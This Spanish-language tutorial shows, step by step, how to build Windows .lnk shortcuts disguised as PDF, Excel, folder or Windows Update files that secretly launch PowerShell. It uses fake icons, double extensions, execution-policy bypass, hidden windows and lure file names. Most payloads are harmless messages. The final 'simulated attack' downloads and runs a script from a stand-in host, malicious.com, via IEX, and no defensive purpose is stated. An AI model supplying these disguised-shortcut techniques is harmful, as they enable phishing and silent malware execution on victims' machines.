### **Ejemplo 1: Crear un `.lnk` que ejecute PowerShell pero parezca un PDF**
**Objetivo**: Crear un enlace que, al hacer clic, abra PowerShell, pero muestre un ícono y nombre de un archivo PDF.

#### **Pasos para crear el `.lnk`:**
1. **Abre PowerShell con permisos de administrador**:
   - Presiona `Win + X` → Elige **Windows PowerShell (Admin)**.

2. **Escribe el siguiente código en PowerShell**:
   ```powershell
   $WshShell = New-Object -ComObject WScript.Shell
   $Shortcut = $WshShell.CreateShortcut("C:\Ruta\Donde\Guardar\documento_secreto.pdf.lnk")
   $Shortcut.TargetPath = "powershell.exe"  # Ejecuta PowerShell
   $Shortcut.Arguments = "-ExecutionPolicy Bypass -Command 'Write-Output ''¡Has sido engañado!'''"
   $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,4"  # Ícono de PDF
   $Shortcut.Save()
   ```

   **Explicación de los parámetros**:
   - **`TargetPath`**: Ruta del programa a ejecutar (en este caso, PowerShell).
   - **`Arguments`**: Comandos que se ejecutarán en PowerShell (muestra un mensaje).
   - **`IconLocation`**: Ícono falso (el número `4` corresponde al ícono de PDF en `shell32.dll`).

3. **Resultado**:
   - El archivo `documento_secreto.pdf.lnk` aparecerá en la ubicación especificada.
   - Al hacer doble clic en él:
     - Parecerá un archivo PDF (ícono).
     - Ejecutará PowerShell y mostrará el mensaje: `¡Has sido engañado!`.

---

### **Ejemplo 2: Enlace que abre una carpeta pero ejecuta un comando oculto**
**Objetivo**: Crear un `.lnk` que abra una carpeta, pero también ejecute un comando en segundo plano.

#### **Pasos para crear el `.lnk`:**
1. **Usa PowerShell para crear el enlace**:
   ```powershell
   $WshShell = New-Object -ComObject WScript.Shell
   $Shortcut = $WshShell.CreateShortcut("C:\Ruta\Donde\Guardar\archivos_confidenciales.lnk")
   $Shortcut.TargetPath = "explorer.exe"  # Abre el Explorador de Windows
   $Shortcut.Arguments = "C:\Users\%USERNAME%\Documents"
   $Shortcut.IconLocation = "C:\Windows\System32\imageres.dll,113"  # Ícono de carpeta confidencial
   $Shortcut.WorkingDirectory = "C:\Users\%USERNAME%\Documents"
   # Agrega un comando oculto usando "cmd.exe"
   $Shortcut.Save()
   ```

   **Agrega un comando oculto** (ej: crear un archivo de prueba):
   - Edita el archivo `.lnk` manualmente o con un editor hexadecimal. **Este paso es avanzado y requiere conocimiento técnico**.

   **Nota**: Modificar el `.lnk` manualmente para incluir comandos ocultos es complejo porque el formato es binario. Para simplificar, usa el método anterior con PowerShell.

---

### **Ejemplo 3: Enlace que simula una actualización de Windows**
**Objetivo**: Crear un `.lnk` que parezca una actualización de Windows pero ejecute un comando.

#### **Pasos para crear el `.lnk`:**
1. **Crea el enlace con PowerShell**:
   ```powershell
   $WshShell = New-Object -ComObject WScript.Shell
   $Shortcut = $WshShell.CreateShortcut("C:\Ruta\Donde\Guardar\windows_update.lnk")
   $Shortcut.TargetPath = "powershell.exe"
   $Shortcut.Arguments = "-WindowStyle Hidden -Command 'Write-Output ''¡Actualización realizada!'''"
   $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,15"  # Ícono de Windows Update
   $Shortcut.Save()
   ```

   - **Resultado**: El enlace parecerá una actualización de Windows, pero ejecutará un comando oculto.

---

### **Cómo camuflar acciones en un `.lnk` (conceptos clave)**
1. **Modificar el ícono**:
   - Usa `shell32.dll`, `imageres.dll` o cualquier otro archivo con íconos incrustados.
   - Ejemplo para ícono de Word: `C:\Windows\System32\WINWORD.EXE,0`.

2. **Agregar parámetros ocultos**:
   - En el parámetro `Arguments`, agrega comandos que se ejecuten en segundo plano:
     ```powershell
     $Shortcut.Arguments = "-Command 'Start-Process notepad.exe; Write-Output ''¡Ataque exitoso!'''"
     ```

3. **Nombre del archivo**:
   - Usa nombres como `actualizacion_urgente.lnk`, `documento_confidencial.lnk`, etc.

---

### **Ejemplo avanzado (simulación de un ataque)**
**Objetivo**: Crear un `.lnk` que simule un documento de Excel pero descargue un archivo malicioso.

#### **Pasos**:
1. **Script en PowerShell**:
   ```powershell
   $WshShell = New-Object -ComObject WScript.Shell
   $Shortcut = $WshShell.CreateShortcut("C:\Ruta\Donde\Guardar\informe_finanzas_2023.xlsx.lnk")
   $Shortcut.TargetPath = "powershell.exe"
   $Shortcut.Arguments = "-Command 'IEX (New-Object Net.WebClient).DownloadString(''http://malicious.com/malware.ps1'')"
   $Shortcut.IconLocation = "C:\Windows\System32\excel.exe,0"  # Ícono de Excel
   $Shortcut.Save()
   ```

   - **Resultado**: Al abrir el enlace, parece un Excel pero descarga un script malicioso.
